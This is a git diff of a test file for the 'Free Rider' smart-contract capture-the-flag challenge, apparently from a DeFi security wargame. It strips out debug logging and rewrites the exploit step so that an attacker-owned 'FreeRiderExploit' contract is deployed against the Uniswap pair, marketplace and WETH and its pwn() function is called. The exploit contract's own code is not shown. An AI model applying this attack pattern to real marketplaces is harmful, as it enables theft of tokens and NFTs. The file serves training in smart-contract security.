@@ -150,44 +150,15 @@ describe("[Challenge] Free Rider", function () {
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
 
-    console.log("1111");
-    console.log("1111");
-    console.log("1111");
-    console.log("1111");
-    console.log("1111");
-
-    const FreeRiderExploit = await ethers.getContractFactory(
-      "FreeRiderExploit"
-    );
-    this.freeRiderExploit = await FreeRiderExploit.deploy(
-      this.token.address,
-      this.buyerContract.address,
-      this.marketplace.address
-    );
-
     const buyerAddr = this.buyerContract.address;
-    const marketAddr = this.marketplace.address;
-    const ExploitAddr = this.freeRiderExploit.address;
 
-    console.log((await this.nft.balanceOf(buyerAddr)).toString());
-    console.log((await this.nft.balanceOf(marketAddr)).toString());
-    console.log((await this.nft.balanceOf(ExploitAddr)).toString());
+    const ExploitFactory = await ethers.getContractFactory('FreeRiderExploit', attacker);
+    const exploit = await ExploitFactory.deploy(this.uniswapPair.address, this.marketplace.address, this.weth.address, buyerAddr);
+    await exploit.pwn();
 
-    console.log((await this.nft.balanceOf(attacker.address)).toString());
-    console.log((await this.nft.balanceOf(deployer.address)).toString()); // deployer
-    console.log((await this.nft.balanceOf(buyer.address)).toString());
-    // ====
-    // ====
-    await this.freeRiderExploit.connect(buyer).attack();
-    // ====
-    // ====
-    console.log((await this.nft.balanceOf(buyerAddr)).toString());
-    console.log((await this.nft.balanceOf(marketAddr)).toString());
-    console.log((await this.nft.balanceOf(ExploitAddr)).toString());
 
-    console.log((await this.nft.balanceOf(attacker.address)).toString());
-    console.log((await this.nft.balanceOf(deployer.address)).toString()); // deployer
-    console.log((await this.nft.balanceOf(buyer.address)).toString());
+
+
   });
 
   after(async function () {
